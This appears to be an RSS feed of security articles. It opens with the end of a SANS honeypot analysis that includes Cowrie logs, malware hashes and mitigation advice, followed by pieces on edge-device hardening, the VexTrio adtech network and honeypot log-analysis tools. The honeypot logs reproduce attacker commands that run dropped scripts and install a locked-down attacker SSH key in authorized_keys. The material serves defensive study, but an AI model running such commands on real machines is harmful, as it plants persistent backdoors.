+ "outfile": "var/lib/cowrie/downloads/8a68d1c08ea31250063f70b1ccb5051db1f7ab6e17d4
+6e9dd3cc292b9849878b",
+ "shasum": "8a68d1c08ea31250063f70b1ccb5051db1f7ab6e17d46e9dd3cc292b9849878
+b"
+ }
+]
+chmod +x clean.sh; sh clean.sh; rm -rf clean.sh[
+ {
+ "eventid": "cowrie.command.input",
+ "input": "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+ "message": "CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh",
+ "sensor": "",
+ "timestamp": "2025-04-29T01:36:35.757277Z",
+ "src_ip": "135.148.27.57",
+ "session": "7332db45b083"
+ },
+ {
+ "eventid": "cowrie.command.input",
+ "input": "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+ "message": "CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh",
+ "sensor": "",
+ "timestamp": "2025-04-29T02:10:37.895619Z",
+ "src_ip": "45.55.187.1",
+ "session": "43583c947eab"
+ },
+ {
+ "eventid": "cowrie.command.input",
+ "input": "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+ "message": "CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh",
+ "sensor": "",
+ "timestamp": "2025-04-29T03:00:30.746579Z",
+ "src_ip": "81.19.140.78",
+ "session": "e2cfd359b841"
+ },
+ {
+ "eventid": "cowrie.command.input",
+ "input": "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+ "message": "CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh",
+ "sensor": "",
+ "timestamp": "2025-04-29T03:34:04.080390Z",
+ "src_ip": "120.133.83.199",
+ "session": "913f4c51570e"
+ },
+ {
+ "eventid": "cowrie.command.input",
+ "input": "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+ "message": "CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh",
+ "sensor": "",
+ "timestamp": "2025-04-29T03:46:59.162406Z",
+ "src_ip": "77.105.181.82",
+ "session": "374ae6b1e98c"
+ }
+]
+Indicators of Compromise (IOCs)Successful compromise, multi-architecture malware uploadHosting "PangaKenya" malware variantsCommand & control server on port 60140 with fallback mechanismsDownloaded and executed "PangaKenya" malware2025-04-29T03:00:30Z - 
+			2025-04-29T04:22:42ZMultiple SSH key installation attempts2025-04-29T05:35:33Z -
+			2025-04-29T05:56:56ZMultiple SSH key installation attempts2025-04-29T05:40:24Z -
+			2025-04-29T07:19:11ZMultiple SSH key installation attempts2025-04-29T11:05:53Z -
+			2025-04-29T14:03:12ZMultiple SSH key installation attemptsSSH key installation attemptSSH key installation attemptSSH key installation attemptSSH key installation attemptSSH key installation attemptSSH key installation attemptSSH key installation attemptSSH key installation attemptSSH key installation attemptSSH key installation attemptSSH key installation attemptSSH key installation attemptSSH key installation attemptFiture 4:Visualisation showing repeated access attempts and persistence mechanisms.Attack Infrastructure AnalysisThe table reveals several key insights:: The attack campaign spans at least 9 countries across Asia, Europe, North America, and Africa.:
+	Primary infrastructure for sophisticated attacks (3 key IPs)Distributed secondary nodes attempting simpler SSH key installations (19+ IPs): Active operation throughout April 29, 2025, suggesting automation.:
+	Asian cluster: China, Japan, South Korea (7+ IPs)European cluster: Russia, Poland, UK, Netherlands (5+ IPs)North American cluster: US, Canada (4+ IPs)African presence: South Africa (1 IP - primary attacker)Key Infrastructure ProvidersPrimary Malware Distribution Server (%%ip:209.141.34.106%%):
+
+	Hosted by FranTech Solutions - a US-based hosting providerLocated in Las Vegas, Nevada, United StatesKnown for offering bulletproof hosting services that are often used by threat actorsSecondary C2 Server (%%ip:202.55.82.250%%):
+	Used for distributing the "linux" binary malware with fallback download methodsAttacker Origin (%%ip:196.251.70.219%%):
+	Used for the most sophisticated attack that deployed multi-architecture binariesOperational Significance: The use of globally distributed IPs for similar attack patterns strongly suggests a sophisticated botnet operation rather than isolated threat actors.This comprehensive geographic distribution indicates the attack campaign likely utilized compromised infrastructure or proxy networks to obfuscate its true origin while conducting a coordinated global attack campaign.Malware File Hashes (SHA-256)811cd6ebeb9e2b7438ad9d7c382db13c1c04b7d520495261093af51797f5d4cc - KKveTTgaAAsecNNaaaa.x86_649ac2e308b0b30354575bba88169283fa7439d34937a148ccb390bcec3c6e296b - KKveTTgaAAsecNNaaaa.x862ef6bb55a79d81fbda6d574456a8c187f610c5ae2ddca38e32cf7cc50912b0bf - redtail.arm7fc8730fbe87bcbdc093a1ffbcb0028ccb4c24638e55d13fd853b07574f4cbe4a - redtail.arm87780e72f7dea978946d4615c8db1b239d3e2c742cfc8be2934006b1fd6071110 - redtail.i686b6ee8e08f1d4992ca85770e6883c1d2206ebbaf42f99d99aba0e26278de8bffb - redtail.x86_64d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e - clean.sh3b15778595cef00d1a51035dd4fd65e6be97e73544cb1899f40aec4aaa0445ae - setup.shKey fingerprint: 2048 SHA256:78gkKoLYeUW62etRipAiAw2jImcwCMnvC5BO9+3mOtYKey comment: rsa-key-20230629chattr -ia ~/.ssh/authorized_keyschattr +ai ~/.ssh/authorized_keysCreation of file /tmp/.opass with password content0a07365cc01fa9fc82608ba4019af499 (SSH-2.0-Go client){
+ "eventid": "cowrie.command.input",
+ "input": "chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.s
+h; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-rsa AAAA
+B3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7Ag
+vfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPX
+xg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrv
+aRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSm
+dw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUM
+Rr rsa-key-20230629\" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; unam
+e -a; echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"; ",
+ "message": "CMD: chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; s
+h setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-r
+sa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7ne
+NVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEa
+DAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMt
+PAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfd
+mHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX
+8+6H7kUMRr rsa-key-20230629\" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_
+keys; uname -a; echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"; ",
+ "sensor": "",
+ "timestamp": "2025-04-29T17:25:48.682372Z",
+ "src_ip": "196.251.70.219",
+ "session": "90db1182d123"
+}
+
+{
+ "eventid": "cowrie.client.kex",
+ "hassh": "0a07365cc01fa9fc82608ba4019af499",
+ "hasshAlgorithms": "curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nist
+p256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellm
+an-group14-sha1,ext-info-c,kex-strict-c-v00@openssh.com;aes128-gcm@openssh.com,ae
+s256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes25
+6-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2
+-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96;none",
+ "kexAlgs": [
+ "curve25519-sha256",
+ "curve25519-sha256@libssh.org",
+ "ecdh-sha2-nistp256",
+ "ecdh-sha2-nistp384",
+ "ecdh-sha2-nistp521",
+ "diffie-hellman-group14-sha256",
+ "diffie-hellman-group14-sha1",
+ "ext-info-c",
+ "kex-strict-c-v00@openssh.com"
+ ],
+ "keyAlgs": [
+ "rsa-sha2-256-cert-v01@openssh.com",
+ "rsa-sha2-512-cert-v01@openssh.com",
+ "ssh-rsa-cert-v01@openssh.com",
+ "ssh-dss-cert-v01@openssh.com",
+ "ecdsa-sha2-nistp256-cert-v01@openssh.com",
+ "ecdsa-sha2-nistp384-cert-v01@openssh.com",
+ "ecdsa-sha2-nistp521-cert-v01@openssh.com",
+ "ssh-ed25519-cert-v01@openssh.com",
+ "ecdsa-sha2-nistp256",
+ "ecdsa-sha2-nistp384",
+ "ecdsa-sha2-nistp521",
+ "rsa-sha2-256",
+ "rsa-sha2-512",
+ "ssh-rsa",
+ "ssh-dss",
+ "ssh-ed25519"
+ ],
+ "encCS": [
+ "aes128-gcm@openssh.com",
+ "aes256-gcm@openssh.com",
+ "chacha20-poly1305@openssh.com",
+ "aes128-ctr",
+ "aes192-ctr",
+ "aes256-ctr"
+ ],
+ "macCS": [
+ "hmac-sha2-256-etm@openssh.com",
+ "hmac-sha2-512-etm@openssh.com",
+ "hmac-sha2-256",
+ "hmac-sha2-512",
+ "hmac-sha1",
+ "hmac-sha1-96"
+ ],
+ "compCS": [
+ "none"
+ ],
+ "langCS": [
+ ""
+ ],
+ "message": "SSH client hassh fingerprint: 0a07365cc01fa9fc82608ba4019af499",
+ "sensor": "",
+ "timestamp": "2025-04-29T17:25:32.857270Z",
+ "src_ip": "196.251.70.219",
+ "session": "90db1182d123"
+}===============================================
+HASSH Threat Intelligence: 0a07365cc01fa9fc82608ba4019af499
+===============================================
+Client: SSH-2.0-Go
+Algorithm suite: curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,
+ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-gr
+oup14-sha1,ext-info-c,kex-strict-c-v00@openssh.com
+Encryption algorithms: aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-
+poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr
+Detected attack patterns: Automated brute force, credential stuffing
+Known threat actors: Associated with mass scanning botnets
+Source IP: 196.251.70.219 (South Africa)
+===============================================
+Mitigation RecommendationsBased on the attack techniques observed, here are key recommendations to protect your systems:Disable password-based SSH authentication in favor of key-based authenticationImplement strong password policies if password authentication must be enabledConsider implementing SSH certificate authentication for enhanced securityImplement multi-factor authentication where possibleImplement IP allowlisting for administrative access when feasibleUse a properly configured firewall to limit SSH access to known networksConsider using a VPN as an additional protection layer for remote accessImplement network segmentation to contain potential breachesRegularly update and patch systemsRemove or disable unnecessary services and softwareImplement the principle of least privilege for all accountsUse intrusion detection/prevention systems to identify suspicious activityMonitor for unauthorized SSH keys in authorized_keys filesWatch for unexpected file attribute changes (especially immutable flags)Monitor for connections to known malicious IP addressesImplement file integrity monitoring for critical system filesDevelop and rehearse an incident response planMaintain offline backups of critical systems and dataEstablish a security baseline to help identify anomaliesConsider using honeypots to detect and study attack techniquesConclusion: Learning from AdversariesWhat makes this attack campaign particularly concerning isn't just its automation, but its global coordination. The logs reveal identical attack patterns originating from dozens of distinct IP addresses across different continents - from South America to Asia to Europe - all using the same SSH key, command sequences, and malware distribution infrastructure. This suggests we're observing a well-organised botnet operation rather than isolated opportunistic attacks.The attackers' use of architecture-specific malware binaries (arm7, arm8, i686, x86_64) indicates they're specifically targeting the growing Internet of Things ecosystem alongside traditional servers. Most concerning is how the attackers attempt to establish persistence through multiple redundant methods like SSH backdoors with immutable attributes, crontab modifications, and likely rootkit components in the 'redtail' binaries.For defenders, this underlines the critical importance of monitoring SSH authentication logs, implementing proper key management, and deploying behavioral analysis tools that can detect the distinctive pattern of file uploads and attribute modifications that precede full compromise. As these attack patterns continue to evolve, sharing this type of detailed analysis becomes increasingly valuable for the broader security community.This honeypot capture represents a valuable learning opportunity. The attackers demonstrated an automated approach to system compromise, using multiple fallback mechanisms and persistence techniques. They came prepared with malware variants for different architectures and took steps to hide their activities.The complexity and automation in this attack highlight an important reality of modern cybersecurity: many attacks are not targeted but opportunistic, using automated tools to scan for and exploit vulnerable systems at scale. A single exposed system with weak credentials can be discovered and compromised within minutes. By studying these attacks in controlled environments, we can better understand adversary techniques and improve our defensive postures. The honeypot serves not just as a detection mechanism but as a cybersecurity training tool, providing real-world examples of the threats systems face daily.This comprehensive attack analysis was created entirely using Notion as my central workspace before exporting to PDF. Notion's flexible database capabilities made organising and parsing through the complex honeypot logs significantly more efficient.For anyone conducting similar security research, Notion offers a surprisingly powerful environment for both collaborative analysis and professional report preparation [7].
 
  
- (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.]]></content:encoded></item><item><title>Atlas of Surveillance</title><link>https://www.schneier.com/blog/archives/2025/02/atlas-of-surveillance.html</link><author>Bruce Schneier</author><category>infosec</category><category>blog</category><pubDate>Mon, 17 Feb 2025 16:35:59 +0000</pubDate><source url="https://www.schneier.com/">Schneider on Security</source><content:encoded><![CDATA[The EFF has released its Atlas of Surveillance, which documents police surveillance technology across the US.]]></content:encoded></item><item><title>My Very Personal Guidance and Strategies to Protect Network Edge Devices, (Thu, Feb 6th)</title><link>https://isc.sans.edu/diary/rss/31660</link><author></author><category>infosec</category><pubDate>Mon, 17 Feb 2025 12:51:04 +0000</pubDate><source url="https://isc.sans.edu/">Sans Edu Diaries</source><content:encoded><![CDATA[Last week, CISA and other national cyber security organizations published an extensive document outlining "Guidance and Strategies to Protect Network Edge Devices." [1] The document is good but also very corporate and "bland." It summarizes good, well-intended advice that will help you secure edge devices. But reading it also made me think, "That's it?" Not that I expected earth-shattering advice eliminating vulnerabilities brought on by accumulating deceased worth of abandoned ware still peddled at often relatively high costs. But I don't know; maybe something more actionable would be helpful. So here is my advice from the small network that is maintained, like so many, "on the side" and not by a team of dedicated edge device experts.0 - Limit Access to Admin FunctionsBefore you do anything, limit access to admin interfaces, and do not forget access via SSH or APIs. At the bare minimum, access should only be available via the LAN interface. Carefully select any exposed services. SSH may be an option if you must have remote access or a VPN solution (many devices support Wireguard, OpenVPN, or other protocols). But the fewer options you enable, the better. Avoid exposing web-based APIs, admin interfaces, or SSL VPN gateways at all costs. HTTPs will not protect you in this case. The issue is numerous web application vulnerabilities that keep popping up in these devices. Move any exposed admin services (HTTPS or SSH) to non-default ports.Removing internet access to admin features will eliminate the vast majority of threats. If you must expose a VPN or SSH, continue reading.1 - Change Credentials and use MFAMaybe this should be 0. Either way, Change your credentials. Your device doesn’t support MFA? Get a different one! Even open-source solutions usually support some kind of MFA these days. OPNSense makes it a bit painful, but it works. Maybe even use a different username instead of "admin" and disable "admin"/"root" if that is an option. It helps a bit. Harden protocols like SSH by using keys.2 - Define a monthly "Router Update Day."I don't care when. Third Thursday of the month, mornings, 10 am? Check if there is an update waiting; check the release notes. Is it important? Apply now. Can it wait? Apply later. Having redundant perimeter devices should be doable even for a smaller network. Add a monthly "perimeter update" reminder to your calendar. Some device manufacturers have mailing lists to notify you of updates or release updates on a specific schedule.Some may not agree with this advice. Commercial permitter security devices are often counterproductive. You can find well-respected, preconfigured, open-source perimeter security devices. For smaller networks, OpenWRT will work great. Use PFSense or OPNSense if you operate a more complex network or need additional features. Open-source packages provide much longer support timelines for existing hardware. Updates are usually painless, support is easy to come by, and, most importantly, You will have more insight into how the device works. Commercial systems make it sound like it is worth spending a lot of money to get less: A black box with a lot of magic packet dust. However, you will not be able to understand how the device works and how to debug it effectively. Some people say that you "pay with your time". The opposite is true in this case: Understanding and maintaining a closed-source solution for perimeter security devices is often more time-consuming or MUCH MORE expensive. If it makes the boss happy, Buy a support contract. Multiple companies or developers behind the particular solution will offer commercial support contracts at competitive prices for all the open-source solutions mentioned above.4 - Mark the Devices Expiration DateEvery device has an expiration date. As you purchase it, define how long the device will be in your network. Keep yourself honest. Apply a sticker to the device noting when and where it was purchased (nice for warranty, too) and when it is supposed to be replaced.5 - Create Automated Configuration BackupsOnce a day? The important part is to automate it. It will not happen unless you automate it. These configuration backups are essential for configuration downgrades to recover from a lousy upgrade quickly or if you need to replace a device. Sadly, this often requires a distinct process.6 - Edge Devices are Endpoints tooSo install endpoint protection software! OPNsense supports Wazuh (I think PFSense, too). Find out what works for your device. At the very least, monitor unapproved changes to the configuration backups. This may be an area where you want to spend some money on commercial software if needed and if it is applicable.[1] https://www.cisa.gov/resources-tools/resources/guidance-and-strategies-protect-network-edge-devices
+ (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.]]></content:encoded></item><item><title>Inside a Dark Adtech Empire Fed by Fake CAPTCHAs</title><link>https://krebsonsecurity.com/2025/06/inside-a-dark-adtech-empire-fed-by-fake-captchas/</link><author>BrianKrebs</author><category>infosec</category><pubDate>Thu, 12 Jun 2025 22:14:00 +0000</pubDate><source url="https://krebsonsecurity.com/">Krebs on Security</source><content:encoded><![CDATA[Late last year, security researchers made a startling discovery: Kremlin-backed disinformation campaigns were bypassing moderation on social media platforms by leveraging the same malicious advertising technology that powers a sprawling ecosystem of online hucksters and website hackers. A new report on the fallout from that investigation finds this dark ad tech industry is far more resilient and incestuous than previously known.In November 2024, researchers at the security firm  published an investigation into “Doppelganger,” a disinformation network that promotes pro-Russian narratives and infiltrates Europe’s media landscape by pushing fake news through a network of cloned websites.Doppelganger campaigns use specialized links that bounce the visitor’s browser through a long series of domains before the fake news content is served. Qurium found Doppelganger relies on a sophisticated “domain cloaking” service, a technology that allows websites to present different content to search engines compared to what regular visitors see. The use of cloaking services helps the disinformation sites remain online longer than they otherwise would, while ensuring that only the targeted audience gets to view the intended content.Qurium discovered that Doppelganger’s cloaking service also promoted online dating sites, and shared much of the same infrastructure with , which is thought to be the oldest malicious traffic distribution system (TDS) in existence. While TDSs are commonly used by legitimate advertising networks to manage traffic from disparate sources and to track who or what is behind each click, VexTrio’s TDS largely manages web traffic from victims of phishing, malware, and social engineering scams.Digging deeper, Qurium noticed Doppelganger’s cloaking service used an Internet provider in Switzerland as the first entry point in a chain of domain redirections. They also noticed the same infrastructure hosted a pair of co-branded affiliate marketing services that were driving traffic to sketchy adult dating sites:  and .The LosPollos ad network incorporates many elements and references from the hit series “Breaking Bad,” mirroring the fictional “Los Pollos Hermanos” restaurant chain that served as a money laundering operation for a violent methamphetamine cartel.The LosPollos advertising network invokes characters and themes from the hit show Breaking Bad. The logo for LosPollos (upper left) is the image of Gustavo Fring, the fictional chicken restaurant chain owner in the show.Affiliates who sign up with LosPollos are given JavaScript-heavy “” that drive traffic into the VexTrio TDS, which in turn distributes the traffic among a variety of advertising partners, including dating services, sweepstakes offers, bait-and-switch mobile apps, financial scams and malware download sites.LosPollos affiliates typically stitch these smart links into  websites that have been hacked via known vulnerabilities, and those affiliates will earn a small commission each time an Internet user referred by any of their hacked sites falls for one of these lures.The Los Pollos advertising network promoting itself on LinkedIn.According to Qurium, TacoLoco is a traffic monetization network that uses deceptive tactics to trick Internet users into enabling “push notifications,” a cross-platform browser standard that allows websites to show pop-up messages which appear outside of the browser. For example, on Microsoft Windows systems these notifications typically show up in the bottom right corner of the screen — just above the system clock.In the case of VexTrio and TacoLoco, the notification approval requests themselves are deceptive — disguised as “CAPTCHA” challenges designed to distinguish automated bot traffic from real visitors. For years, VexTrio and its partners have successfully tricked countless users into enabling these site notifications, which are then used to continuously pepper the victim’s device with a variety of phony virus alerts and misleading pop-up messages.Examples of VexTrio landing pages that lead users to accept push notifications on their device.According to a December 2024 annual report from , nearly 40 percent of compromised websites in 2024 redirected visitors to VexTrio via LosPollos smartlinks.On November 14, 2024, Qurium published research to support its findings that LosPollos and TacoLoco were services operated by , a company registered in the Czech Republic and Russia, and that Adspro runs its infrastructure at the Swiss hosting providers  and .Qurium noted the LosPollos and TacoLoco sites state that their content is copyrighted by  and , both Swiss firms that are run by the owner of Teknology SA, Giulio Vitorrio Leonardo Cerutti. Further investigation revealed LosPollos and TacoLoco were apps developed by a company called , which lists Cerutti as its CEO.The apps marketed by Holacode include numerous VPN services, as well as one called  that claims to stop unwanted push notifications. But in January, Infoblox said they tested the app on their own mobile devices, and found it hides the user’s notifications, and then after 24 hours stops hiding them and demands payment. Spamshield subsequently changed its developer name from Holacode to , although Infoblox noted that the Terms of Service for several of the rebranded ApLabz apps still referenced Holacode in their terms of service.Incredibly, Cerutti threatened to sue me for defamation before I’d even uttered his name or sent him a request for comment (Cerutti sent the unsolicited legal threat back in January after his company and my name were merely tagged in an Infoblox post on LinkedIn about VexTrio).Asked to comment on the findings by Qurium and Infoblox, Cerutti vehemently denied being associated with VexTrio. Cerutti asserted that his companies all strictly adhere to the regulations of the countries in which they operate, and that they have been completely transparent about all of their operations.“We are a group operating in the advertising and marketing space, with an affiliate network program,” Cerutti responded. “I am not [going] to say we are perfect, but I strongly declare we have no connection with VexTrio at all.”“Unfortunately, as a big player in this space we also get to deal with plenty of publisher fraud, sketchy traffic, fake clicks, bots, hacked, listed and resold publisher accounts, etc, etc.,” Cerutti continued. “We bleed lots of money to such malpractices and conduct regular internal screenings and audits in a constant battle to remove bad traffic sources. It is also a highly competitive space, where some upstarts will often play dirty against more established mainstream players like us.”Working with Qurium, researchers at the security firm  released details about VexTrio’s infrastructure to their industry partners. Just four days after Qurium published its findings, LosPollos announced it was suspending its push monetization service. Less than a month later, Adspro had rebranded to .A mind map illustrating some of the key findings and connections in the Infoblox and Qurium investigations. Click to enlarge.In March 2025, researchers at GoDaddy chronicled how  — a malware strain that has consistently redirected victims to VexTrio throughout its eight years of activity — suddenly stopped doing that on November 20, 2024. Virtually overnight, DollyWay and several other malware families that had previously used VexTrio began pushing their traffic through another TDS called .Digging further into historical DNS records and the unique code scripts used by the Help TDS, Infoblox determined it has long enjoyed an exclusive relationship with VexTrio (at least until LosPollos ended its push monetization service in November).In a report released today, Infoblox said an exhaustive analysis of the JavaScript code, website lures, smartlinks and DNS patterns used by VexTrio and Help TDS linked them with at least four other TDS operators (not counting TacoLoco). Those four entities — , ,  and  — are all Russia-based push monetization programs that pay affiliates to drive signups for a variety of schemes, but mostly online dating services.“As Los Pollos push monetization ended, we’ve seen an increase in fake CAPTCHAs that drive user acceptance of push notifications, particularly from Partners House,” the Infoblox report reads. “The relationship of these commercial entities remains a mystery; while they are certainly long-time partners redirecting traffic to one another, and they all have a Russian nexus, there is no overt common ownership.”, vice president of threat intelligence at Infoblox, said the security industry generally treats the deceptive methods used by VexTrio and other malicious TDSs as a kind of legally grey area that is mostly associated with less dangerous security threats, such as adware and scareware.But Burton argues that this view is myopic, and helps perpetuate a dark adtech industry that also pushes plenty of straight-up malware, noting that hundreds of thousands of compromised websites around the world every year redirect victims to the tangled web of VexTrio and VexTrio-affiliate TDSs.“These TDSs are a nefarious threat, because they’re the ones you can connect to the delivery of things like information stealers and scams that cost consumers billions of dollars a year,” Burton said. “From a larger strategic perspective, my takeaway is that Russian organized crime has control of malicious adtech, and these are just some of the many groups involved.”As KrebsOnSecurity warned way back in 2020, it’s a good idea to be very sparing in approving notifications when browsing the Web. In many cases these notifications are benign, but as we’ve seen there are numerous dodgy firms that are paying site owners to install their notification scripts, and then reselling that communications pathway to scammers and online hucksters.If you’d like to prevent sites from ever presenting notification requests, all of the major browser makers let you do this — either across the board or on a per-website basis. While it is true that blocking notifications entirely can break the functionality of some websites, doing this for any devices you manage on behalf of your less tech-savvy friends or family members might end up saving everyone a lot of headache down the road.To modify site notification settings in , navigate to Settings, Privacy & Security, Permissions, and click the “Settings” tab next to “Notifications.” That page will display any notifications already permitted and allow you to edit or delete any entries. Tick the box next to “Block new requests asking to allow notifications” to stop them altogether.In , click the icon with the three dots to the right of the address bar, scroll all the way down to Settings, Privacy and Security, Site Settings, and Notifications. Select the “Don’t allow sites to send notifications” button if you want to banish notification requests forever.In Apple’s browser, go to Settings, Websites, and click on Notifications in the sidebar. Uncheck the option to “allow websites to ask for permission to send notifications” if you wish to turn off notification requests entirely.]]></content:encoded></item><item><title>Airlines Secretly Selling Passenger Data to the Government</title><link>https://www.schneier.com/blog/archives/2025/06/airlines-secretly-selling-passenger-data-to-the-government.html</link><author>Bruce Schneier</author><category>infosec</category><category>blog</category><pubDate>Thu, 12 Jun 2025 15:44:47 +0000</pubDate><source url="https://www.schneier.com/">Schneider on Security</source><content:encoded><![CDATA[A data broker owned by the country’s major airlines, including Delta, American Airlines, and United, collected U.S. travellers’ domestic flight records, sold access to them to Customs and Border Protection (CBP), and then as part of the contract told CBP to not reveal where the data came from, according to internal CBP documents obtained by 404 Media. The data includes passenger names, their full flight itineraries, and financial details.]]></content:encoded></item><item><title>Automated Tools to Assist with DShield Honeypot Investigations &amp;#x5b;Guest Diary&amp;#x5d;, (Wed, Jun 11th)</title><link>https://isc.sans.edu/diary/rss/32038</link><author></author><category>infosec</category><pubDate>Thu, 12 Jun 2025 11:50:56 +0000</pubDate><source url="https://isc.sans.edu/">Sans Edu Diaries</source><content:encoded><![CDATA[[This is a Guest Diary by William Constantino, an ISC intern as part of the SANS.edu BACS program]In the beginning of my Internet Storm Center (ISC) internship, I wasted too much time trying to build my SIEM from an old computer I had lying around, or a new Raspberry Pi I purchased. I keep running into roadblocks and errors. Also, I was distracted while trying to finish up another course, and I had every intention of looking at my log files every day, but it wasn’t happening. I did the easy thing of saying “I’ll look at it tomorrow. The JSON logs and Sqlite3 were the other problems with reading the logs without a SIEM, it produced massive amounts of data to parse through. To me it was like trying to find a needle in a haystack. To resolve this problem, I built two automated python tools to assist with those tasks and analyze the data. The first tool helped me process and organize the data I was looking at and helped point me in the right direction of interesting things to investigate further. This tool gave me the following capabilities:It loads, reads, and parses JSON files by extracting the source IP addresses, request methods, accessed URLs, timestamps, user agents, response codes, credentials, and hashes.Tracks IP activity by recording the different request methods used (GET, POST, etc.), and it stores the timestamps of requests for timeline analysis.Counts URL accesses for identifying the most frequently visited endpoints, logs the user agent strings to detect patterns in client access, and captures the response codes to track server errors or unusual behavior.Detects suspicious activity by flagging suspicious file requests (.php, .exe, .zip, etc.), extracts credential attempts (20 of the most used usernames and passwords), and identifies hashed values (MD5, SHA1, CRC32, NTLM, etc.)Generates a generic security report by reporting the top 10 most active IPs, bottom 10 least active IPs, and the total amount of Unique IPs. It gives a summary of total requests, detected hashes, and credential attempts.Lastly it measures how long the script takes to process the log file. It displays the results in minutes and seconds (I added this last because I just wanted to know how long it was taking to read and parse through the data).The sample output from this tool is from 2025-05-31, and it was a massive log file at over 3.5GB for one day (why I added the timer). I will break down the output in sections for Tool 1 below:Figure 1: Top 10 most Active IP addresses, Bottom 10 Least Active IPs, and General Summary.
+Figure 2: The Request Methods Used and Top Accessed URLs.
+Figure 3: Suspicious File Requests and Top User-Agent Strings.
+Figure 4: Top attempted usernames and attempted passwords.Continued Output Tool 1:
+Figure 5: Hashes Detected and the Time it took to read the log file.Once I had this output to look at, I determine what IP address that is the most interesting. However, I usually start with the one with the largest number of requests to see what is going on. I will look at all 10-20 (Top and Bottom 10) individually and see what they were doing and then determine which IP address to highlight for my analysis. Sometimes, if I’m looking at the same exploit, I’ll research all the other IPs to see if there is a novel attack or a different type of attack. To assist with a further investigation, I developed a second tool to help me with this. It is basically, the same as the first tool, but it focuses on further detailed analysis of specific IP(s).The second python tool performs a detailed analysis on a specific IP address or addresses that you want further analysis on from a given a JSON log file. This tool does the following things:Provides a prompt to input one (1) or multiple IP addresses.It extracts the “sip” (source IP) field from each log entry and identifies requests.The script gathers the HTTP request methods used by the target IP (GET, POST, HEAD, etc.). It also records the timestamps of the request timeframe.Analyzes the User-Agent Strings which can provide insight into whether the requests originated from a legitimate browser, automated bot, or a hacking tool.Examines response codes to show whether the target IP successfully accessed certain resources.Detects suspicious file requests (.php, .exe, .zip, .bat, .sh, .py)Credential attempts using default usernames and passwords (currently only the top twenty of each). Below is my output for the second tool (also for 2025-05-31). It is basically, the same as the first tool, but it focuses on further detailed analysis of specific IPs.
+Figure 6: Prompt to enter one (1) IP or multiple IP addresses separated by a comma.
+Figure 7: I inputted IP address (141.98.80.134). In this case, it was the #1 active IP.Continued output of Tool 2:
+Figure 8: Analysis for IP (141.98.80.134) with a massive number of requests.
+According to the top accessed URLs in this investigation of this IP are known for CVE-2021-20016. I’ve actually seen this type of attack lately. 
+Figure 9: Internet Storm Center Report for an exploit for Sonicwall [1].Continued output of Tool 2:
+Figure 10: User-Agent Strings and Attempted Passwords. This script will notify if it did not find any data for the specific fields looked at. The first tool does not do this, but usually there are all types of data and no field is empty during the investigation.Continued output of Tool 2:
+Figure 11: The Log Analysis is Complete. It took almost 13 minutes to complete. This was a massive file compared to other days, so analysis will be much faster with less data.
